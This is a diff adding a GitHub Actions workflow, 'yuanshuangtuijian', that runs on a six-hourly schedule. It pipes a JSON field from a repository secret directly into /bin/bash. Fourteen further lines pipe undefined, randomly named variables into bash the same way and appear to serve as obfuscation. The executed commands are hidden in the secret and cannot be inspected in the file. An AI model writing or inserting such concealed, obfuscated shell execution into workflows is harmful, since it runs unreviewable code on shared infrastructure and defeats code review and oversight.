@@ -1,0 +1,31 @@
+name: yuanshuangtuijian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanshuangtuijian
+        env:
+          qbov114: ${{ secrets.qbov114 }}
+        run: |
+          echo $qbov114 | jq -r .e217 | /bin/bash
+          echo $qe58 | jq -r .mt61 | /bin/bash
+          echo $ddad9 | jq -r .g17 | /bin/bash
+          echo $uvssu90 | jq -r .ny4661 | /bin/bash
+          echo $atshm0 | jq -r .xydr8 | /bin/bash
+          echo $fw751 | jq -r .cchym2173 | /bin/bash
+          echo $dph2120 | jq -r .xz26 | /bin/bash
+          echo $o82013 | jq -r .yiue65634 | /bin/bash
+          echo $nsg8 | jq -r .j7 | /bin/bash
+          echo $av02 | jq -r .hbd96254 | /bin/bash
+          echo $k0 | jq -r .c1438 | /bin/bash
+          echo $kejx37 | jq -r .gp22673 | /bin/bash
+          echo $wy17 | jq -r .av5 | /bin/bash
+          echo $zynw628 | jq -r .b089 | /bin/bash
+          echo $dwm15204 | jq -r .p630 | /bin/bash
+
